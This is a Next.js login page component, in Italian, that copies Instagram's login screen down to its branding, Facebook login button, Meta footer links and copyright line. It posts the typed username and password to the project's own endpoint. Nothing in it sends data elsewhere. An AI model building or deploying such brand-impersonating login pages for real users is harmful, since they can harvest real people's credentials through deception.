'use client';

import Link from 'next/link';
import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Image from 'next/image';

export default function LoginPage() {
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    if (searchParams.get('registered') === 'true') {
      console.log('Registrazione completata con successo');
    }
  }, [searchParams]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      const redirectParam = searchParams.get('redirect') || '/';

      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: identifier,
          password,
          redirect: redirectParam
        }),
        credentials: 'include',
      });

      const data = await response.json();

      if (!response.ok) {
        setError(
          data.error ||
            'Spiacenti, la tua richiesta non è andata a buon fine. Riprova tra qualche istante.'
        );
        setLoading(false);
        return;
      }

      // Login riuscito - forza un hard reload della pagina
      window.location.href = data.redirectTo || '/';
    } catch (err) {
      setError('Spiacenti, si è verificato un problema. Riprova più tardi.');
      setLoading(false);
    }
  };

  const isFormValid = identifier.length > 0 && password.length > 5;

  return (
    <div className="min-h-screen bg-[#FAFAFA] dark:bg-[#0C1014] flex flex-col">
      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 pt-8 pb-0">
        <div className="flex items-center gap-8 max-w-[935px] w-full">
          {/* Left side - Phones Image (Hidden on mobile) */}
          <div className="hidden lg:block flex-shrink-0">
            <Image
              src="/phones.png"
              alt="Instagram phones"
              width={454}
              height={618}
              className="object-contain"
              priority
            />
          </div>

          {/* Right side - Forms */}
          <div className="flex flex-col items-center justify-center flex-1 max-w-[350px] mx-auto">
            {/* Login Box */}
            <div className="bg-[#FAFAFA] dark:bg-[#0C1014] w-full mb-2.5">
              <div className="flex flex-col items-center px-10 pt-10 pb-2.5">
                {/* Instagram Logo */}
                <h1
                  className="text-[52px] font-normal tracking-tight text-[#262626] dark:text-white mb-3"
                  style={{ fontFamily: 'var(--font-instagram)' }}
                >
                  Instagram
                </h1>

                {/* Error Message */}
                {error && (
                  <div className="w-full mb-2.5 p-2.5 text-center text-sm text-[#ED4956] bg-[#FFF3F4] dark:bg-[#3a1f1f] border border-[#EDB8BD] dark:border-[#5d3e3e] rounded-sm">
                    <p>{error}</p>
                  </div>
                )}

                {/* Login Form */}
                <form onSubmit={handleSubmit} className="w-full mt-6">
                  <div className="mb-1.5">
                    <label htmlFor="identifier" className="sr-only">
                      Numero di telefono, nome utente o e-mail
                    </label>
                    <input
                      id="identifier"
                      type="text"
                      autoCapitalize="off"
                      autoCorrect="off"
                      placeholder="Numero di telefono, nome utente o e-mail"
                      value={identifier}
                      onChange={(e) => setIdentifier(e.target.value)}
                      className="w-full h-9 px-2 text-xs bg-[#FAFAFA] dark:bg-[#121212] border border-[#DBDBDB] dark:border-[#262626] rounded-[3px] text-[#262626] dark:text-white placeholder-[#8E8E8E] focus:outline-none focus:border-[#A8A8A8] dark:focus:border-[#A8A8A8]"
                      aria-label="Numero di telefono, nome utente o e-mail"
                    />
                  </div>
                  <div className="mb-2 relative">
                    <label htmlFor="password" className="sr-only">
                      Password
                    </label>
                    <input
                      id="password"
                      type={showPassword ? 'text' : 'password'}
                      placeholder="Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full h-9 px-2 pr-16 text-xs bg-[#FAFAFA] dark:bg-[#121212] border border-[#DBDBDB] dark:border-[#262626] rounded-[3px] text-[#262626] dark:text-white placeholder-[#8E8E8E] focus:outline-none focus:border-[#A8A8A8] dark:focus:border-[#A8A8A8]"
                      aria-label="Password"
                    />
                    {password.length > 0 && (
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-sm font-semibold text-[#262626] dark:text-white"
                      >
                        {showPassword ? 'Nascondi' : 'Mostra'}
                      </button>
                    )}
                  </div>
                  <button
                    type="submit"
                    disabled={!isFormValid || loading}
                    className={`w-full h-8 rounded-lg text-sm font-semibold mt-2 transition-all ${
                      isFormValid && !loading
                        ? 'bg-[#0095F6] text-white hover:bg-[#1877F2] active:opacity-70'
                        : 'bg-[#4CB5F9] text-white/60 cursor-not-allowed pointer-events-none'
                    }`}
                  >
                    {loading ? 'Accesso in corso...' : 'Accedi'}
                  </button>
                </form>

                {/* OR Divider */}
                <div className="flex items-center w-full my-2.5">
                  <div className="flex-1 h-px bg-[#DBDBDB] dark:bg-[#262626]"></div>
                  <div className="px-4 text-[13px] font-semibold text-[#8E8E8E]">O</div>
                  <div className="flex-1 h-px bg-[#DBDBDB] dark:bg-[#262626]"></div>
                </div>

                {/* Facebook Login */}
                <button
                  type="button"
                  className="w-full flex items-center justify-center gap-2 mb-5 hover:opacity-80 transition"
                >
                  <svg width="16" height="16" viewBox="0 0 48 48" fill="#385185">
                    <path d="M24 0C10.745 0 0 10.745 0 24s10.745 24 24 24 24-10.745 24-24S37.255 0 24 0zm6.5 12.5h-4.25c-.69 0-1.25.56-1.25 1.25v3.5h5.5l-.75 5.5h-4.75V38h-6V22.75h-3v-5.5h3v-4.25c0-3.45 2.8-6.25 6.25-6.25h5.25v5.75z" />
                  </svg>
                  <span className="text-sm font-semibold text-[#385185] dark:text-[#E0F1FF]">
                    Accedi con Facebook
                  </span>
                </button>
              </div>

              {/* Forgot Password - Inside the box */}
              <div className="py-3 px-10 text-center">
                <Link
                  href="#"
                  className="text-xs font-semibold text-[#00376B] dark:text-[#E0F1FF] hover:opacity-70 transition"
                >
                  Password dimenticata?
                </Link>
              </div>
            </div>

            {/* Report Content - Under Login Box */}
            <div className="text-center w-full mt-3 mb-10">
              <p className="text-xs text-[#8E8E8E] dark:text-[#A8A8A8] leading-4">
                Puoi anche{' '}
                <Link href="#" className="font-semibold text-[#0095F6] hover:underline">
                  segnalare i contenuti che ritieni violino
                </Link>{' '}
                nel tuo Paese senza accedere.
              </p>
            </div>

            {/* Sign Up Box */}
            <div className="bg-[#FAFAFA] dark:bg-[#0C1014] w-full p-5 text-center mb-2.5">
              <p className="text-sm text-[#262626] dark:text-white">
                Non hai un account?{' '}
                <Link
                  href="/register"
                  className="font-semibold text-[#0095F6] hover:text-[#00376B] dark:hover:text-[#E0F1FF]"
                >
                  Iscriviti
                </Link>
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="py-3 px-4 mt-auto">
        <div className="max-w-[1066px] mx-auto">
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-1.5 mb-3 text-xs text-[#8E8E8E] dark:text-[#A8A8A8]">
            <a href="#" className="hover:underline">
              Meta
            </a>
            <a href="#" className="hover:underline">
              Informazioni
            </a>
            <a href="#" className="hover:underline">
              Blog
            </a>
            <a href="#" className="hover:underline">
              Lavora con noi
            </a>
            <a href="#" className="hover:underline">
              Aiuto
            </a>
            <a href="#" className="hover:underline">
              API
            </a>
            <a href="#" className="hover:underline">
              Privacy
            </a>
            <a href="#" className="hover:underline">
              Condizioni
            </a>
            <a href="#" className="hover:underline">
              Luoghi
            </a>
            <a href="#" className="hover:underline">
              Instagram Lite
            </a>
            <a href="#" className="hover:underline">
              Meta AI
            </a>
            <a href="#" className="hover:underline">
              Threads
            </a>
            <a href="#" className="hover:underline">
              Caricamento dei contatti e non-utenti
            </a>
            <a href="#" className="hover:underline">
              Meta Verified
            </a>
          </div>
          <div className="flex justify-center gap-4 text-xs text-[#8E8E8E] dark:text-[#A8A8A8]">
            <select className="bg-transparent text-[#8E8E8E] dark:text-[#A8A8A8] text-xs border-none cursor-pointer focus:outline-none">
              <option>Italiano</option>
              <option>English</option>
              <option>Español</option>
              <option>Français</option>
              <option>Deutsch</option>
            </select>
            <span>© 2025 Instagram from Meta</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
